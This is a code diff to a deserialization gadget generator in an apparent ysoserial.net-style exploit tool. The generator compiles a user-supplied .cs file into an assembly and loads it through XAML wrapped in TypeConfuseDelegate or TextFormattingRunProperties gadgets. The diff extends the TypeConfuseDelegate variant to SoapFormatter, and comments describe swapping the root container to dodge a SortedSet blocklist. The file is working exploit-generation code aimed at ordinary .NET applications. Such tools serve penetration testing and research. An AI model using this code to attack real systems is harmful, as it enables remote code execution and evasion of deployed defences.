@@ -27,12 +27,13 @@ namespace ysonet.Generators
 
         public override string AdditionalInfo()
         {
-            return "Loads assembly using XAML. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.Windows.Forms.dll'. "
+            return "Loads assembly using XAML. This gadget interprets the command parameter as the path to the .cs file that should be compiled as an exploit class. Use a semicolon to separate the file from any additional required assemblies, e.g., '-c ExploitClass.cs;System.dll'. "
                 // Kept short on purpose: this text is the interactive info panel's first
                 // block, and a long one pushes the formatter/input/category lines off the
                 // panel. The full story lives in the rootcontainer option help.
                 + "Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) "
-                + "to dodge a SortedSet wire-name blocklist, and self-tests in a child process.";
+                + "to dodge a SortedSet wire-name blocklist; SoapFormatter supports roots 1 and 3. "
+                + "It self-tests in a child process.";
         }
 
         public override CommandInputType CommandInput()
@@ -44,13 +45,11 @@ namespace ysonet.Generators
         {
             return new List<GadgetVariant>
             {
-                // Variant 1 wraps the XAML in TypeConfuseDelegate, whose gadget object is
-                // a generic sorted container (SortedSet by default; the container option
-                // can swap it for SortedDictionary or TreeSet, both generic too).
-                // SoapFormatter cannot serialize a generic type, so this variant opts out
-                // of SoapFormatter for every container (variant 2,
-                // TextFormattingRunProperties, is not generic and serializes fine).
-                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)").Without(Formatters.SoapFormatter),
+                // Variant 1 uses TypeConfuseDelegate's direct SOAP document for the
+                // one-generic-layer SortedSet and TreeSet roots. Rootcontainer 2 has the
+                // deeper SortedDictionary<KeyValuePair<...>> graph and is refused in
+                // Generate() for SOAP only.
+                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)"),
                 new GadgetVariant(2, "TextFormattingRunProperties wrapper")
                     // No sorted container in this wrapper, so the root-container option
                     // does not apply and the editor stops offering it.
@@ -83,9 +82,9 @@ namespace ysonet.Generators
         public override List<string> SupportedFormatters()
         {
             // The "(N)" suffix is a display-only annotation meaning "this formatter
-            // carries N variants". SoapFormatter has no suffix because only variant 2
-            // supports it (variant 1 is a generic SortedSet; see Variants()).
-            return new List<string> { "BinaryFormatter (2)", "SoapFormatter", "NetDataContractSerializer (2)", "LosFormatter (2)" };
+            // carries N variants". SOAP carries both wrappers; the TCD wrapper supports
+            // rootcontainer 1 and 3 and explicitly refuses rootcontainer 2.
+            return new List<string> { "BinaryFormatter (2)", "SoapFormatter (2)", "NetDataContractSerializer (2)", "LosFormatter (2)" };
         }
 
         int variant_number = 1;
@@ -120,10 +119,15 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            // Reject an impossible variant+formatter pair (e.g. variant 1 + SoapFormatter)
-            // before the expensive .cs compile below, with a clear message instead of a
-            // deep framework exception.
+            // Validate the declared variant before the expensive .cs compile below.
             GuardVariantFormatter(variant_number, formatter);
+            if (variant_number == 1
+                && formatter.Equals(Formatters.SoapFormatter,
+                    StringComparison.OrdinalIgnoreCase)
+                && root_container_number == 2)
+                throw new ArgumentException("SoapFormatter supports the TypeConfuseDelegate "
+                    + "wrapper with rootcontainer 1 (SortedSet) and 3 (TreeSet), not 2 "
+                    + "(SortedDictionary).");
 
             var files = inputArgs.Cmd;
             byte[] asmData = LocalCodeCompiler.GetAsmBytes(files);
@@ -200,20 +204,20 @@ xmlns:c=""clr-namespace:System.IO.Compression;assembly=System""
                 xmlResourceDict = XmlMinifier.Minify(xmlResourceDict, null, null);
             }
 
-            object obj;
-
             if (variant_number == 2)
             {
-                obj = new TextFormattingRunPropertiesMarshal(xmlResourceDict);
+                return Serialize(new TextFormattingRunPropertiesMarshal(xmlResourceDict),
+                    formatter, inputArgs);
             }
-            else
+            if (formatter.Equals(Formatters.SoapFormatter,
+                StringComparison.OrdinalIgnoreCase))
             {
-                // TypeConfuseDelegate wrapper: a generic sorted container (see
-                // GetXamlGadget), so SoapFormatter is opted out for this variant above.
-                obj = TypeConfuseDelegateGenerator.GetXamlGadget(xmlResourceDict, root_container_number);
+                return TypeConfuseDelegateGenerator.SerializeSoapXamlGadget(
+                    xmlResourceDict, root_container_number, inputArgs);
             }
 
-            return Serialize(obj, formatter, inputArgs);
+            return Serialize(TypeConfuseDelegateGenerator.GetXamlGadget(
+                xmlResourceDict, root_container_number), formatter, inputArgs);
         }
 
         // Shared with DataSetOldBehaviourFromFileGenerator's --compressed path.
